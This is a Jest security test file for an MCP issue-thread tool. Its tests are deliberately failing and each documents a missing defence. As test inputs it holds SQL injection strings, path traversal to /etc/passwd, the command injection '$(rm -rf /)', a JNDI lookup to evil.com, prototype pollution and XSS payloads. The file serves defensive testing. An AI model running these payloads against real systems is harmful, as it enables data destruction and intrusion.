/**
 * MCP Tool Security Tests: Enhanced Issue Thread System
 * Feature: 1.3.1-enhanced-issue-thread-system
 * 
 * CRITICAL: These tests are INTENTIONALLY DESIGNED TO FAIL
 * They demonstrate security vulnerabilities in MCP tool implementations.
 * Tests will PASS only after security vulnerabilities are fixed.
 * 
 * Security Vulnerabilities Tested:
 * 1. Metadata Injection - Malicious JSON structures in MCP tools
 * 2. Input Validation Bypass - Insufficient sanitization in tools
 * 3. Authorization Bypass - No permission checks in MCP operations
 * 4. Resource Exhaustion - No limits on MCP tool inputs
 */

import Database from 'better-sqlite3';
import { IssueOperations } from '../../src/database/operations';
import { createAddThreadEntryTool } from '../../src/tools/add-thread-entry';
import { createGetTimelineTool } from '../../src/tools/get-issue-timeline';
import type { ThreadEntryType } from '../../src/types/thread';
import path from 'path';
import fs from 'fs';

describe('MCP Tool Security Vulnerabilities (INTENTIONALLY FAILING TESTS)', () => {
  let db: Database.Database;
  let operations: IssueOperations;
  
  beforeEach(() => {
    // Create in-memory database for testing
    db = new Database(':memory:');
    
    // Load base schema
    const schemaPath = path.join(__dirname, '../../src/database/schema.sql');
    const schema = fs.readFileSync(schemaPath, 'utf8');
    db.exec(schema);
    
    // Apply enhanced thread migration
    const migrationSQL = `
      PRAGMA foreign_keys = OFF;
      
      CREATE TABLE issue_thread_new (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        issue_id INTEGER NOT NULL REFERENCES issues(id) ON DELETE CASCADE,
        entry_type TEXT NOT NULL CHECK (entry_type IN (
          'status_change', 'comment', 'checkout', 'unlock', 'resolution_attempt',
          'agent_action', 'system_action', 'approval', 'assignment', 'priority_change'
        )),
        content TEXT NOT NULL,
        author TEXT NOT NULL DEFAULT 'user',
        created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
        metadata JSON
      );
      
      INSERT INTO issue_thread_new SELECT * FROM issue_thread;
      DROP TABLE issue_thread;
      ALTER TABLE issue_thread_new RENAME TO issue_thread;
      
      CREATE INDEX idx_thread_issue_id ON issue_thread(issue_id);
      CREATE INDEX idx_thread_created_at ON issue_thread(created_at DESC);
      CREATE INDEX idx_thread_entry_type ON issue_thread(entry_type);
      CREATE INDEX idx_thread_author ON issue_thread(author);
      
      PRAGMA foreign_keys = ON;
    `;
    db.exec(migrationSQL);
    
    operations = new IssueOperations(db);
    
    // Create test issues for security testing
    operations.createIssue({
      issue_id: 'SEC-MCP-001',
      title: 'MCP Security Test Issue',
      priority: 'high',
      project: 'security-test',
      description: 'Issue for testing MCP tool security vulnerabilities'
    });
    
    operations.createIssue({
      issue_id: 'SEC-MCP-002',  
      title: 'Confidential Security Issue',
      priority: 'critical',
      project: 'security-test',
      description: 'Confidential issue with sensitive data'
    });
  });
  
  afterEach(() => {
    db.close();
  });
  
  describe('HIGH VULNERABILITY: Metadata Injection (FAILING)', () => {
    test('FAILS: should reject oversized JSON metadata payloads', async () => {
      // SECURITY VULNERABILITY: No size limits on metadata enable resource exhaustion
      
      const tool = createAddThreadEntryTool(db);
      const oversizedMetadata = {
        attack_type: 'resource_exhaustion',
        large_payload: 'X'.repeat(1000000), // 1MB JSON payload
        circular_refs: null as any,
        malicious: true
      };
      
      // Create circular reference for additional complexity
      oversizedMetadata.circular_refs = oversizedMetadata;
      
      // EXPECTED: Metadata size validation error
      // ACTUAL: Oversized metadata accepted (vulnerability)
      await expect(tool.execute({
        issue_id: 'SEC-MCP-001',
        entry_type: 'comment',
        content: 'Test with massive metadata',
        metadata: oversizedMetadata
      })).rejects.toThrow('Metadata payload too large'); // This will FAIL
    });
    
    test('FAILS: should validate metadata structure for malicious injections', async () => {
      // Test various metadata injection attacks
      
      const tool = createAddThreadEntryTool(db);
      
      const maliciousMetadata = {
        __proto__: { isAdmin: true }, // Prototype pollution attempt
        constructor: { prototype: { admin: true } }, // Constructor pollution
        'script_injection': '<script>alert("XSS")</script>',
        'sql_injection': "'; DROP TABLE issues; --",
        'path_traversal': '../../../etc/passwd',
        'command_injection': '$(rm -rf /)',
        nested_attack: {
          deep_nesting: {
            level_3: {
              level_4: {
                payload: 'A'.repeat(10000) // Deep nested large payload
              }
            }
          }
        }
      };
      
      // EXPECTED: Malicious metadata rejected
      // ACTUAL: Metadata injection succeeds (vulnerability)
      await expect(tool.execute({
        issue_id: 'SEC-MCP-001',
        entry_type: 'comment',
        content: 'Metadata injection test',
        metadata: maliciousMetadata
      })).rejects.toThrow('Malicious metadata detected'); // This will FAIL
    });
    
    test('FAILS: should prevent metadata tampering with system fields', async () => {
      // Attempt to inject system-level metadata
      
      const tool = createAddThreadEntryTool(db);
      
      const systemTamperingMetadata = {
        id: 999999, // Attempt to override auto-increment
        issue_id: 'SEC-MCP-002', // Attempt to change target issue
        author: 'system', // Attempt to escalate privileges
        created_at: '2020-01-01T00:00:00Z', // Attempt to backddate
        deleted: false, // Attempt to set deletion flag
        admin_override: true,
        system_level: 'root',
        bypass_security: true
      };
      
      const result = await tool.execute({
        issue_id: 'SEC-MCP-001',
        entry_type: 'comment',
        content: 'System tampering attempt',
        metadata: systemTamperingMetadata
      });
      
      // EXPECTED: System fields protected from tampering
      // ACTUAL: Metadata tampering may succeed (vulnerability)
      expect(result.issue_id).toBe('SEC-MCP-001'); // This may FAIL if tampering works
      
      // Verify entry in database doesn't have tampered values
      const entry = db.prepare('SELECT * FROM issue_thread WHERE id = ?').get(result.thread_entry_id) as any;
      const metadata = JSON.parse(entry.metadata);
      
      expect(metadata).not.toHaveProperty('id'); // This will FAIL - not filtered
      expect(metadata).not.toHaveProperty('admin_override'); // This will FAIL
      expect(metadata).not.toHaveProperty('system_level'); // This will FAIL
    });
    
    test('FAILS: should validate JSON structure to prevent parser exploitation', async () => {
      // Test JSON parser vulnerabilities
      
      const tool = createAddThreadEntryTool(db);
      
      // Malformed JSON that could exploit parser
      const malformedMetadata = {
        normal_field: 'value',
        // This would be injected as raw JSON string to test parser
        raw_injection: '{"__proto__": {"isAdmin": true}}',
        buffer_overflow: Buffer.alloc(100000, 'A'), // Large buffer
        unicode_attack: '\u0000\u0001\u0002', // Control characters
        float_precision: Number.MAX_SAFE_INTEGER + 1 // Precision attack
      };
      
      // EXPECTED: JSON structure validation
      // ACTUAL: Malformed JSON processed (vulnerability)
      await expect(tool.execute({
        issue_id: 'SEC-MCP-001',
        entry_type: 'comment',
        content: 'JSON parser exploitation test',
        metadata: malformedMetadata
      })).rejects.toThrow('Invalid JSON structure'); // This will FAIL
    });
  });
  
  describe('HIGH VULNERABILITY: Input Validation Bypass (FAILING)', () => {
    test('FAILS: should validate issue_id format and prevent injection', async () => {
      // SECURITY VULNERABILITY: No input validation on issue_id parameter
      
      const tool = createAddThreadEntryTool(db);
      
      const maliciousIssueIds = [
        "'; DROP TABLE issues; --", // SQL injection attempt
        '../../../etc/passwd', // Path traversal
        '<script>alert("XSS")</script>', // XSS payload
        '${jndi:ldap://evil.com/a}', // JNDI injection
        'SEC-MCP-001\x00admin', // Null byte injection
        'A'.repeat(1000) // Buffer overflow attempt
      ];
      
      for (const maliciousId of maliciousIssueIds) {
        // EXPECTED: Input validation rejects malicious issue IDs
        // ACTUAL: Malicious input processed (vulnerability)
        await expect(tool.execute({
          issue_id: maliciousId,
          entry_type: 'comment',
          content: 'Injection test'
        })).rejects.toThrow(/Invalid issue_id format/); // This will FAIL
      }
    });
    
    test('FAILS: should validate content length and prevent DoS', async () => {
      // Test content size limits to prevent resource exhaustion
      
      const tool = createAddThreadEntryTool(db);
      
      const massiveContent = 'A'.repeat(10000000); // 10MB content
      
      // EXPECTED: Content size limit enforced
      // ACTUAL: Massive content accepted (vulnerability)
      await expect(tool.execute({
        issue_id: 'SEC-MCP-001',
        entry_type: 'comment',
        content: massiveContent
      })).rejects.toThrow('Content too large'); // This will FAIL
    });
    
    test('FAILS: should sanitize content to prevent stored XSS', async () => {
      // Test XSS payload sanitization
      
      const tool = createAddThreadEntryTool(db);
      
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(\'XSS\')">',
        'javascript:alert("XSS")',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<svg onload="alert(\'XSS\')">',
        '"><script>alert("XSS")</script>',
        '\'\"><script>alert(String.fromCharCode(88,83,83))</script>'
      ];
      
      for (const payload of xssPayloads) {
        const result = await tool.execute({
          issue_id: 'SEC-MCP-001',
          entry_type: 'comment',
          content: payload
        });
        
        // Get entry from database to check stored content
        const entry = db.prepare('SELECT content FROM issue_thread WHERE id = ?').get(result.thread_entry_id) as any;
        
        // EXPECTED: XSS payloads sanitized
        // ACTUAL: Raw XSS payloads stored (vulnerability)
        expect(entry.content).not.toContain('<script>'); // This will FAIL
        expect(entry.content).not.toContain('onerror='); // This will FAIL
        expect(entry.content).not.toContain('javascript:'); // This will FAIL
      }
    });
    
    test('FAILS: should validate entry_type to prevent enumeration attacks', async () => {
      // Test entry type validation bypass
      
      const tool = createAddThreadEntryTool(db);
      
      const invalidEntryTypes = [
        'admin_action', // Non-existent type
        'debug_mode', // System type
        'sql_injection',
        '', // Empty string
        null as any, // Null value
        123 as any, // Non-string type
        'comment; DROP TABLE issue_thread; --' // Injection attempt
      ];
      
      for (const invalidType of invalidEntryTypes) {
        // EXPECTED: Entry type validation rejects invalid types
        // ACTUAL: Invalid types may be accepted (vulnerability)
        await expect(tool.execute({
          issue_id: 'SEC-MCP-001',
          entry_type: invalidType,
          content: 'Invalid entry type test'
        })).rejects.toThrow(/Invalid entry_type/); // This will FAIL
      }
    });
  });
  
  describe('MEDIUM VULNERABILITY: Authorization Bypass (FAILING)', () => {
    test('FAILS: should enforce user permissions for sensitive operations', async () => {
      // SECURITY VULNERABILITY: No authorization checks in MCP tools
      
      const tool = createAddThreadEntryTool(db);
      
      // Attempt to perform admin-level operations without authorization
      const adminOperations = [
        { entry_type: 'system_action', content: 'System-level operation' },
        { entry_type: 'unlock', content: 'Unlocking issue without permission' },
        { entry_type: 'assignment', content: 'Assigning to system user', 
          metadata: { assigned_to: 'system', assigned_by: 'unauthorized_user' }
        }
      ];
      
      for (const operation of adminOperations) {
        // EXPECTED: Authorization check rejects unauthorized operations
        // ACTUAL: Operations succeed without permission checks (vulnerability)
        await expect(tool.execute({
          issue_id: 'SEC-MCP-001',
          entry_type: operation.entry_type as ThreadEntryType,
          content: operation.content,
          author: 'user', // Regular user attempting admin operations
          metadata: operation.metadata
        })).rejects.toThrow(/Insufficient permissions/); // This will FAIL
      }
    });
    
    test('FAILS: should prevent cross-issue data access', async () => {
      // Test if user can access data from issues they shouldn\'t see
      
      const timelineTool = createGetTimelineTool(db);
      
      // Try to access confidential issue without proper authorization
      const result = await timelineTool.execute({
        issue_id: 'SEC-MCP-002' // Confidential issue
        // No authorization context provided
      });
      
      // EXPECTED: Access denied for confidential issues
      // ACTUAL: Full access granted (vulnerability)
      expect(result.success).toBe(false); // This will FAIL
      expect(result.entries).toHaveLength(0); // This will FAIL
    });
    
    test('FAILS: should validate author authorization', async () => {
      // Test author impersonation
      
      const tool = createAddThreadEntryTool(db);
      
      const impersonationAttempts = [
        { author: 'system', content: 'Impersonating system user' },
        { author: 'bug-fixer', content: 'Impersonating agent' },
        { author: 'admin', content: 'Impersonating administrator' }
      ];
      
      for (const attempt of impersonationAttempts) {
        // EXPECTED: Author authorization prevents impersonation
        // ACTUAL: Author impersonation succeeds (vulnerability)
        await expect(tool.execute({
          issue_id: 'SEC-MCP-001',
          entry_type: 'comment',
          content: attempt.content,
          author: attempt.author as any
          // Missing: current user context to validate author claim
        })).rejects.toThrow(/Author impersonation not allowed/); // This will FAIL
      }
    });
  });
  
  describe('MEDIUM VULNERABILITY: Information Disclosure (FAILING)', () => {
    test('FAILS: should not expose sensitive metadata in timeline responses', async () => {
      // Add entries with sensitive metadata
      
      const addTool = createAddThreadEntryTool(db);
      await addTool.execute({
        issue_id: 'SEC-MCP-001',
        entry_type: 'comment',
        content: 'Entry with sensitive data',
        metadata: {
          internal_notes: 'Confidential investigation details',
          admin_password: 'secret123',
          system_path: '/var/log/security/audit.log',
          debug_info: 'Database connection string: mysql://user:pass@localhost'
        }
      });
      
      const timelineTool = createGetTimelineTool(db);
      const result = await timelineTool.execute({
        issue_id: 'SEC-MCP-001'
      });
      
      // EXPECTED: Sensitive metadata filtered from responses
      // ACTUAL: Full metadata including sensitive info returned (vulnerability)
      result.entries.forEach(entry => {
        if (entry.metadata) {
          expect(entry.metadata).not.toHaveProperty('admin_password'); // This will FAIL
          expect(entry.metadata).not.toHaveProperty('internal_notes'); // This will FAIL
          expect(entry.metadata).not.toHaveProperty('debug_info'); // This will FAIL
        }
      });
    });
    
    test('FAILS: should not leak system information in error messages', async () => {
      // Force system errors to check information disclosure
      
      const tool = createAddThreadEntryTool(db);
      
      // Close database to simulate system failure
      db.close();
      
      try {
        await tool.execute({
          issue_id: 'SEC-MCP-001',
          entry_type: 'comment',
          content: 'Test error disclosure'
        });
      } catch (error: any) {
        // EXPECTED: Generic error message without system details
        // ACTUAL: Detailed system error information leaked (vulnerability)
        expect(error.message).not.toContain('database'); // This will FAIL
        expect(error.message).not.toContain('sqlite'); // This will FAIL
        expect(error.message).not.toContain('/tmp'); // This will FAIL
        expect(error.message).not.toContain('EACCES'); // This will FAIL
        expect(error.message).not.toContain('permission denied'); // This will FAIL
      }
    });
  });
  
  describe('Performance Security Tests (FAILING)', () => {
    test('FAILS: should prevent ReDoS attacks in metadata validation', async () => {
      // Regular Expression Denial of Service through complex validation patterns
      
      const tool = createAddThreadEntryTool(db);
      
      const redosPayload = {
        attack_string: 'a'.repeat(1000) + 'X', // Pattern that could cause ReDoS
        complex_pattern: 'aaaaaaaaaaaaaaaaaaaaaaaaaaaa!', // Catastrophic backtracking
        nested_validation: {
          field1: 'a'.repeat(500) + 'b',
          field2: 'a'.repeat(500) + 'c'
        }
      };
      
      const startTime = Date.now();
      
      try {
        await tool.execute({
          issue_id: 'SEC-MCP-001',
          entry_type: 'comment',
          content: 'ReDoS attack test',
          metadata: redosPayload
        });
      } catch (error) {
        // Error is acceptable, but should be fast
      }
      
      const endTime = Date.now();
      
      // EXPECTED: Validation completes quickly with timeout protection
      // ACTUAL: May hang system with complex patterns (vulnerability)
      expect(endTime - startTime).toBeLessThan(1000); // This may FAIL with ReDoS
    });
    
    test('FAILS: should limit concurrent MCP tool executions', async () => {
      // Test concurrent execution limits to prevent resource exhaustion
      
      const tool = createAddThreadEntryTool(db);
      
      // Create 100 concurrent executions
      const concurrentPromises = [];
      for (let i = 0; i < 100; i++) {
        concurrentPromises.push(tool.execute({
          issue_id: 'SEC-MCP-001',
          entry_type: 'comment',
          content: `Concurrent execution ${i}`,
          metadata: { index: i, data: 'X'.repeat(1000) }
        }));
      }
      
      // EXPECTED: Some executions rejected due to concurrency limits
      // ACTUAL: All executions proceed causing resource exhaustion (vulnerability)
      const results = await Promise.allSettled(concurrentPromises);
      const rejected = results.filter(r => r.status === 'rejected');
      
      expect(rejected.length).toBeGreaterThan(0); // This will FAIL - no limits
    });
  });
});